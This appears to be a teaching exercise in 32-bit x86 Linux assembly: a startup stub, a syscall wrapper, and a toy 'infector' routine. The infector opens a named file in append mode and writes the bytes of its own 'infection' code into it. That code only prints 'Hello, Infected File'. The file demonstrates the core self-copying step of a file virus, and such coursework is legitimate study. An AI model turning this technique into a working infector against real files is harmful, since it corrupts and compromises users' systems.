section .data
    MSG db "Hello, Infected File", 0
    outfile dd 1
    MSG_LEN EQU 20
    STDOUT EQU 1
    WRITE EQU 4
    OPEN EQU 5
    CLOSE EQU 6
    PERMISSIONS EQU 0644
    O_FLAGS EQU 1025

section .text
global _start
global system_call
global infector
global code_start
extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state

    ; Print message
    mov     eax, WRITE
    mov     ebx, STDOUT
    mov     ecx, MSG
    mov     edx, MSG_LEN
    int     0x80

    popad                   ; Restore caller state (registers)
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
code_end:
infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state

    ; Open file
    mov     eax, OPEN
    mov     ebx, [ebp+8]
    mov     ecx, O_FLAGS
    mov     edx, PERMISSIONS
    int     0x80
    mov     dword [outfile], eax ; Update outfile

    ; Write
    mov     eax, WRITE
    mov     ebx, dword [outfile]
    mov     ecx, code_start
    mov     edx, code_end
    sub     edx, code_start
    int     0x80

    ; Close file
    mov     eax, CLOSE
    mov     ebx, dword[outfile]
    int     0x80

    popad                   ; Restore caller state (registers)
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller